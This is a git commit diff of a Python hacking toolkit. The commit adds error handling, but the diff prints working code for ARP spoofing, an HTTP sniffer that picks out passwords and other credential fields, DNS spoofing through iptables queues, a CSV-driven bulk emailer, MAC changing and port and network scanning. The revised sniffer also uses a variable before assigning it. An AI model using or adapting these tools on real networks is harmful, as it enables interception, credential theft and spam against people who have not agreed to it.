2bf6d44b6976815b02b19c103ce82f032f76151b
glyched <90681715+glyched@users.noreply.github.com>
2022-01-24 10:58:16 +0000

    cleaning up stuff, added a bit more error handling

--- main.py
+++ main.py
@@ -14,215 +14,233 @@ import time
 import scapy_http.http as http
 import netfilterqueue
 def encryption_fernet():
-    decrpt_or_encrpt = input('do you want to decrypt or encrypt the file(e/d):')
-    if decrpt_or_encrpt == 'e':
-        file_name = input('enter path or file name:')
-        key = Fernet.generate_key()
-        with open('filekey.key', 'wb') as filekey:
-            filekey.write(key)
-        with open('filekey.key', 'rb') as filekey:
-            key = filekey.read()
-        fernet = Fernet(key)
-        with open(file_name, 'rb') as file:
-            original = file.read()
-        encrypted = fernet.encrypt(original)
-        with open(file_name, 'wb') as encrypted_file:
-            encrypted_file.write(encrypted)
-    elif decrpt_or_encrpt == 'd':
-        file_name = input('enter path or file name:')
-        key = input('Enter key:')
-        fernet = Fernet(key)
-        with open(file_name, 'rb') as enc_file:
-            encrypted = enc_file.read()
-        decrypted = fernet.decrypt(encrypted)
+    try:
+        decrpt_or_encrpt = input('do you want to decrypt or encrypt the file(e/d):')
+        if decrpt_or_encrpt == 'e':
+            file_name = input('enter path or file name:')
+            key = Fernet.generate_key()
+            with open('filekey.key', 'wb') as filekey:
+                filekey.write(key)
+            with open('filekey.key', 'rb') as filekey:
+                key = filekey.read()
+            fernet = Fernet(key)
+            with open(file_name, 'rb') as file:
+                original = file.read()
+            encrypted = fernet.encrypt(original)
+            with open(file_name, 'wb') as encrypted_file:
+                encrypted_file.write(encrypted)
+        elif decrpt_or_encrpt == 'd':
+            file_name = input('enter path or file name:')
+            key = input('Enter key:')
+            fernet = Fernet(key)
+            with open(file_name, 'rb') as enc_file:
+                encrypted = enc_file.read()
+            decrypted = fernet.decrypt(encrypted)
 
-        with open(file_name, 'wb') as dec_file:
-            dec_file.write(decrypted)
+            with open(file_name, 'wb') as dec_file:
+                dec_file.write(decrypted)
+    except:
+        print(Fore.RED,'an error has occured')
 def port_scanner():
-    subprocess.call('clear', shell=True)
-    remoteServer    = input('Enter a remote host to scan: ')
-    remoteServerIP  = socket.gethostbyname(remoteServer)
-    print ('-' * 60)
-    print (Fore.YELLOW,'Please wait, scanning remote host', remoteServerIP)
-    print ('-' * 60)
-    t1 = datetime.now()
     try:
-        for port in range(1,1025):  
-            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            result = sock.connect_ex((remoteServerIP, port))
-            if result == 0:
-                print (Fore.LIGHTGREEN_EX,'Port {}: 	 Open'.format(port))
-    except KeyboardInterrupt:
-        print (Fore.RED,'You pressed Ctrl+C')
-        sys.exit()
-
-    except socket.gaierror:
-        print (Fore.Red,'Hostname could not be resolved. Exiting')
-        sys.exit()
-
-    except socket.error:
-        print (Fore.RED,'Couldnt connect to server')
-        sys.exit()
-    t2 = datetime.now()
-    total =  t2 - t1
-    print (Fore.YELLOW,'Scanning Completed in: ', total)
-def sherlock():
-    print(Fore.YELLOW,'making sure that sherlock is installed...'  )
-    if os.path.isfile('sherlock') == True:
-        usr_name= input(Fore.LIGHTGREEN_EX,'enter username you want to search: ')
-        subprocess.call('sherlock ' , usr_name, shell = True)
-    elif os.path.isfile('sherlock') == False:
-        print(Fore.LIGHTGREEN_EX,'downloading sherlock...')
-        subprocess.call('git clone https://github.com/sherlock-project/sherlock.git', shell = True)
-        subprocess.call('cd sherlock', shell = True)
-        print(Fore.LIGHTGREEN_EX,'installing required libraries...')
-        subprocess.call('pip install -r requirements.txt', shell = True)
-        usr_name= input('enter username you want to search: ')
-        subprocess.call('sherlock ' + usr_name, shell = True)
-    else:
-        print('error')
-def bulk_email():
-    print(Fore.LIGHTGREEN_EX, '-')
-    s = smtplib.SMTP('smtp.gmail.com', 587)
-    email_address = input('enter sender email: ')
-    email_pass = input('enter password:')
-    print(Fore.LIGHTGREEN_EX, '-')
-    s.ehlo()
-    # start TLS for security
-    s.starttls()
-    s.ehlo()
-    # Authentication
-    print(Fore.YELLOW, '--------------')
-    print(Fore.YELLOW,'logged in...')
-    print(Fore.YELLOW, '--------------')
-    # message to be sent
-    print(Fore.LIGHTGREEN_EX, '-')
-    subject = input('enter subject: ')
-    body = input('enter your body:')
-    
-
-    message = EmailMessage()
-    message.set_content(body)
-    message['Subject'] = subject
-    emails = input('enter filename or path to emails csv file:')
-    print(Fore.LIGHTGREEN_EX, '-')
-    with open(emails, newline='') as csvfile:
-        spamreader = csv.reader(csvfile, delimiter=' ', quotechar='|')
-        for email in spamreader:
-            s.send_message(message,email_address, email[0])
-            print('Send To ' + email[0])
-    s.quit()
-        # terminating the session
-       
-    print(Fore.YELLOW, '--------------')
-    print('sent')
-    print(Fore.YELLOW, '--------------')
-def mac_changer():
-    print(Fore.LIGHTGREEN_EX,'[-] Please enter a valid MAC Address')
-    new_mac = input('enter new mac address: ')
-    interface = input('enter interface name: ')
-    print('\n[+] Changing the MAC Address to', new_mac)
-    subprocess.call(['sudo', 'ifconfig', interface, 'down'])
-    subprocess.call(['sudo', 'ifconfig', interface, 'hw', 'ether', new_mac])
-    subprocess.call(['sudo', 'ifconfig', interface, 'up'])
-    ifconfig_result = subprocess.check_output(['ifconfig', interface])
-    ifconfig_results_search = re.search(r'\w\w:\w\w:\w\w:\w\w:\w\w:\w\w', ifconfig_result.decode('utf-8'))
-    if ifconfig_results_search:
-        print(Fore.LIGHTGREEN_EX, 'the MAC is changed to',ifconfig_results_search.group(0))
-    else:
-        print(Fore.LIGHTRED_EX, '[-] could not find mac address')
-def network_scanner():
-    ip_r = input('enter ip range:')
-    arp_broadcast = scapy.ARP(pdst = ip_r)
-    broadcast = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')
-    arp_request_broadcast = broadcast/arp_broadcast
-    answered_list,un= scapy.srp(arp_request_broadcast, timeout=1,verbose = False)   
-    clients_list = []
-    print('IP\t\t\tMAC ADDRESS\n---------------------------------------------------------')
-    for i in answered_list:
-        client_dict= {'ip': i[1].psrc, 'mac': i[1].hwsrc}
-        clients_list.append(client_dict)
-    result_list = clients_list
-    for i in result_list:
-        
-        print(i['ip'], '\t\t', i['mac'])
-def arp_spoof():
-    sent_packets = 0
-    target_ip = input('enter target ip:')
-    router_ip= input('enter router ip:')
-    print(Fore.LIGHTBLUE_EX,' note:use packet sniffer with it for intercepting and viwing all packets')
-    def get_mac(ip):
-        mac = 'xx'
+        subprocess.call('clear', shell=True)
+        remoteServer    = input('Enter a remote host to scan: ')
+        remoteServerIP  = socket.gethostbyname(remoteServer)
+        print ('-' * 60)
+        print (Fore.YELLOW,'Please wait, scanning remote host', remoteServerIP)
+        print ('-' * 60)
+        t1 = datetime.now()
         try:
-            arp_request = scapy.ARP(pdst=ip)
-            broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
-            arp_request_broadcast = broadcast/arp_request
-            answered_list = scapy.srp(arp_request_broadcast, timeout=1 , verbose=False)[0]
-            mac = answered_list[0][1].hwsrc
-        except:
-            pass
-        finally:
-            return mac
-    def spoof(t_ip, s_ip):
-        t_mac = get_mac(t_ip)
-        packet = scapy.ARP(op=2, pdst =t_ip, hwdst=t_mac, psrc =s_ip  )
-        scapy.send(packet, verbose= False)
-    def restore(router_ip, source_ip):
-        router_mac = get_mac(router_ip)
-        source_mac = get_mac(source_ip)
-        packet = scapy.ARP(op = 2, pdst =source_ip, hwdst = source_mac, psrc =router_ip, hwsrc =router_mac )
-        scapy.send(packet, verbose = False, count = 5)
+            for port in range(1,1025):  
+                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                result = sock.connect_ex((remoteServerIP, port))
+                if result == 0:
+                    print (Fore.LIGHTGREEN_EX,'Port {}: 	 Open'.format(port))
+        except KeyboardInterrupt:
+            print (Fore.RED,'You pressed Ctrl+C')
+            sys.exit()
+
+        except socket.gaierror:
+            print (Fore.Red,'Hostname could not be resolved. Exiting')
+            sys.exit()
+
+        except socket.error:
+            print (Fore.RED,'Couldnt connect to server')
+            sys.exit()
+        t2 = datetime.now()
+        total =  t2 - t1
+        print (Fore.YELLOW,'Scanning Completed in: ', total)    
+    except:
+        print(Fore.RED, 'an error has occured')
+def sherlock():
     try:
-        while True:
-            spoof(target_ip, router_ip)
-            spoof(router_ip,target_ip)
-            sent_packets = sent_packets + 2      
-            print(Fore.MAGENTA,'\r[+] Packets Sent: ' + str(sent_packets), end=' ')                               
-            time.sleep(2)            
-    except KeyboardInterrupt:
-        print(Fore.LIGHTBLUE_EX,'\ncleaning up/restoring arp table')
+        print(Fore.YELLOW,'making sure that sherlock is installed...'  )
+        if os.path.isfile('sherlock') == True:
+            usr_name= input(Fore.LIGHTGREEN_EX,'enter username you want to search: ')
+            subprocess.call('sherlock ' , usr_name, shell = True)
+        elif os.path.isfile('sherlock') == False:
+            print(Fore.LIGHTGREEN_EX,'downloading sherlock...')
+            subprocess.call('git clone https://github.com/sherlock-project/sherlock.git', shell = True)
+            subprocess.call('cd sherlock', shell = True)
+            print(Fore.LIGHTGREEN_EX,'installing required libraries...')
+            subprocess.call('pip install -r requirements.txt', shell = True)
+            usr_name= input('enter username you want to search: ')
+            subprocess.call('sherlock ' + usr_name, shell = True)
+    except:
+        print(Fore.RED, 'an error has occured')
+def bulk_email():
+    try:
+        print(Fore.LIGHTGREEN_EX, '-')
+        s = smtplib.SMTP('smtp.gmail.com', 587)
+        email_address = input('enter sender email: ')
+        email_pass = input('enter password:')
+        print(Fore.LIGHTGREEN_EX, '-')
+        s.ehlo()
+        # start TLS for security
+        s.starttls()
+        s.ehlo()
+        # Authentication
+        print(Fore.YELLOW, '--------------')
+        print(Fore.YELLOW,'logged in...')
+        print(Fore.YELLOW, '--------------')
+        # message to be sent
+        print(Fore.LIGHTGREEN_EX, '-')
+        subject = input('enter subject: ')
+        body = input('enter your body:')
+        
+
+        message = EmailMessage()
+        message.set_content(body)
+        message['Subject'] = subject
+        emails = input('enter filename or path to emails csv file:')
+        print(Fore.LIGHTGREEN_EX, '-')
+        with open(emails, newline='') as csvfile:
+            spamreader = csv.reader(csvfile, delimiter=' ', quotechar='|')
+            for email in spamreader:
+                s.send_message(message,email_address, email[0])
+                print('Send To ' + email[0])
+        s.quit()
+            # terminating the session
+        
+        print(Fore.YELLOW, '--------------')
+        print('sent')
+        print(Fore.YELLOW, '--------------')
+    except:
+        print(Fore.RED, 'an error has occured')
+def mac_changer():
+    try:
+        print(Fore.LIGHTGREEN_EX,'[-] Please enter a valid MAC Address')
+        new_mac = input('enter new mac address: ')
+        interface = input('enter interface name: ')
+        print(Fore.LIGHTBLUE_EX,'\n[+] Changing the MAC Address to...{}'.format(new_mac))
+        subprocess.call(['sudo', 'ifconfig', interface, 'down'])
+        subprocess.call(['sudo', 'ifconfig', interface, 'hw', 'ether', new_mac])
+        subprocess.call(['sudo', 'ifconfig', interface, 'up'])
+        ifconfig_result = subprocess.check_output(['ifconfig', interface])
+        ifconfig_results_search = re.search(r'\w\w:\w\w:\w\w:\w\w:\w\w:\w\w', ifconfig_result.decode('utf-8'))
+        if ifconfig_results_search:
+            print(Fore.LIGHTGREEN_EX, 'the MAC is changed to',ifconfig_results_search.group(0))
+        else:
+            print(Fore.LIGHTRED_EX, '[-] could not find mac address')
+    except:
+        print(Fore.RED, 'an error occured')
+def network_scanner():
+    try:
+        ip_r = input('enter ip range:')
+        arp_broadcast = scapy.ARP(pdst = ip_r)
+        broadcast = scapy.Ether(dst = 'ff:ff:ff:ff:ff:ff')
+        arp_request_broadcast = broadcast/arp_broadcast
+        answered_list,un= scapy.srp(arp_request_broadcast, timeout=1,verbose = False)   
+        clients_list = []
+        print('IP\t\t\tMAC ADDRESS\n---------------------------------------------------------')
+        for i in answered_list:
+            client_dict= {'ip': i[1].psrc, 'mac': i[1].hwsrc}
+            clients_list.append(client_dict)
+        result_list = clients_list
+        for i in result_list:
+            
+            print(i['ip'], '\t\t', i['mac'])
+    except:
+        print(Fore.RED, ' an error occured')
+def arp_spoof():
+    try:
+        sent_packets = 0
+        target_ip = input('enter target ip:')
+        router_ip= input('enter router ip:')
+        print(Fore.LIGHTBLUE_EX,' note:use packet sniffer with it for intercepting and viwing all packets')
+        def get_mac(ip):
+            mac = 'xx'
+            try:
+                arp_request = scapy.ARP(pdst=ip)
+                broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
+                arp_request_broadcast = broadcast/arp_request
+                answered_list = scapy.srp(arp_request_broadcast, timeout=1 , verbose=False)[0]
+                mac = answered_list[0][1].hwsrc
+            except:
+                pass
+            finally:
+                return mac
+        def spoof(t_ip, s_ip):
+            t_mac = get_mac(t_ip)
+            packet = scapy.ARP(op=2, pdst =t_ip, hwdst=t_mac, psrc =s_ip  )
+            scapy.send(packet, verbose= False)
+        def restore(router_ip, source_ip):
+            router_mac = get_mac(router_ip)
+            source_mac = get_mac(source_ip)
+            packet = scapy.ARP(op = 2, pdst =source_ip, hwdst = source_mac, psrc =router_ip, hwsrc =router_mac )
+            scapy.send(packet, verbose = False, count = 5)
+        try:
+            while True:
+                spoof(target_ip, router_ip)
+                spoof(router_ip,target_ip)
+                sent_packets = sent_packets + 2      
+                print(Fore.MAGENTA,'\r[+] Packets Sent: ' + str(sent_packets), end=' ')                               
+                time.sleep(2)            
+        except KeyboardInterrupt:
+            print(Fore.LIGHTBLUE_EX,'\ncleaning up/restoring arp table')
+            restore(target_ip, router_ip)
+            restore(router_ip, target_ip)
+            print(Fore.LIGHTRED_EX,'\n[-] detected CTRL + C... EXITING')
+    except:
+        print(Fore.RED, ' an error occured')
         restore(target_ip, router_ip)
         restore(router_ip, target_ip)
-        print(Fore.LIGHTRED_EX,'\n[-] detected CTRL + C... EXITING')
-
-    
-    
-
-
 def packet_sniffer():
-    print(Fore.LIGHTBLUE_EX,'NOTE:while used without a mitm(man in the middle attack) running, this will only scan packets from your device, use with arpspoofer(in this tool set) for good results')
-    print(Fore.RED, 'NOTE: THIS IS FOR HTTP SITES ONLY, AND SCANS ONLY HTTP LAYERS,will add https bypassing soon')
-    print(Fore.GREEN, '-')
-    interface = input('enter the interface you want to sniff:')
-    print(Fore.LIGHTMAGENTA_EX, '-')
-    def process_packet(packet):
-        if packet.haslayer(http.HTTPRequest):
-    
-            url = packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
-            print('url -->',str(url))
-    
-            if packet.haslayer(scapy.Raw):
-                load = packet[scapy.Raw].load
-                keyword = ['email', 'password', 'unames', 'username', 'pass', 'passcode', 'pin', ' phno', 'phone']
-                for i in keyword:
-                    if i.encode() in load:
-                        print(Fore.GREEN, '-')
-                        print('username/password -->',load) 
-                        print(Fore.MAGENTA, '-')
+    try:
+        print(Fore.LIGHTBLUE_EX,'NOTE:while used without a mitm(man in the middle attack) running, this will only scan packets from your device, use with arpspoofer(in this tool set) for good results')
+        print(Fore.RED, 'NOTE: THIS IS FOR HTTP SITES ONLY, AND SCANS ONLY HTTP LAYERS,will add https bypassing soon')
+        print(Fore.GREEN, '-')
+        interface = input('enter the interface you want to sniff:')
+        print(Fore.LIGHTMAGENTA_EX, '-')
+        def process_packet(packet):
+            if packet.haslayer(http.HTTPRequest):
+        
+                url = packet[http.HTTPRequest].Host , packet[http.HTTPRequest].Path
+                print(Fore.MAGENTA,'url --> {}'.format(str(load)))
+        
+                if packet.haslayer(scapy.Raw):
+                    load = packet[scapy.Raw].load
+                    keyword = ['email', 'password', 'unames', 'username', 'pass', 'passcode', 'pin', ' phno', 'phone','pu', 'login_name', 'enter', 'input']
+                    for i in keyword:
+                        if i.encode() in load:
+                            print(Fore.GREEN, '-')
+                            print(Fore.GREEN,'username/password --> {}'.format(load)) 
+                            print(Fore.MAGENTA, '-')
 
-    scapy.sniff(iface=interface, store=False, prn=process_packet)
+        scapy.sniff(iface=interface, store=False, prn=process_packet)
+    except:
+        print(Fore.RED, 'an error occured')
 def dns_spoof():
-
-    key_website = bytes(input("enter the website u wanna redirect:"),  'utf-8')
-    redirect_ip = input("enter ip you wanna redirect to:")
-    que_num = int(input("enter queue number(for ip tables, if you dont know what to do, enter 3):"))
-    print("IF AFTER QUITING THE PROGRAM, YOUR NETWORK CONECTIVITY GOES DOWN, RUN iptables -F")
+    key_website = bytes(input('enter the website u wanna redirect:'),  'utf-8')
+    redirect_ip = input('enter ip you wanna redirect to:')
+    que_num = int(input('enter queue number(for ip tables, if you dont know what to do, enter 3):'))
+    print('IF AFTER QUITING THE PROGRAM, YOUR NETWORK CONECTIVITY GOES DOWN, RUN iptables -F')
     def process_packet(packet):
         scapy_packet = scapy.IP(packet.get_payload())
         if scapy_packet.haslayer(scapy.DNSRR):
             qname = scapy_packet[scapy.DNSQR].qname    
             if  key_website in qname:
-                print("[+] Spoofing Target")
+                print(Fore.LIGHTBLUE_EX,'[+] Spoofing Target')
                 answer = scapy.DNSRR(rrname=qname, rdata=redirect_ip)
                 scapy_packet[scapy.DNS].an = answer
                 scapy_packet[scapy.DNS].ancount = 1
@@ -245,7 +263,7 @@ def dns_spoof():
         queue.run()
     except:
         os.system('iptables -F')
-        print("CTRL + C detected, flushing ip table and cleaning things up")
+        print('CTRL + C detected, flushing ip table and cleaning things up')
 try:
     while True:
         print(Fore.LIGHTYELLOW_EX, '-------------------------------------')
